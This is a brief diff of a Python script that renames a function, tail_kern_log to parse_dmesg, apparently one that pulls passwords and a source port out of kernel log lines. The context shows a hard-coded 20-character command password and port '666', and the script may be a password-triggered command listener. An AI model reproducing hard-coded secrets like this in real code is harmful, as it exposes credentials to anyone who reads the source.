@@ -10,7 +10,7 @@ command_password = "dlSmtkQaGTfATveHtjwb"
 command_port = "666"
 
 
-def tail_kern_log():
+def parse_dmesg():
     parsed_options_password = ''
     parsed_command_password = ''
     parsed_source_port = ''
@@ -43,7 +43,7 @@ def tail_kern_log():
 
 def main():
     assert len(command_password) == 20
-    tail_kern_log()
+    parse_dmesg()
 
 
 if __name__ == '__main__':
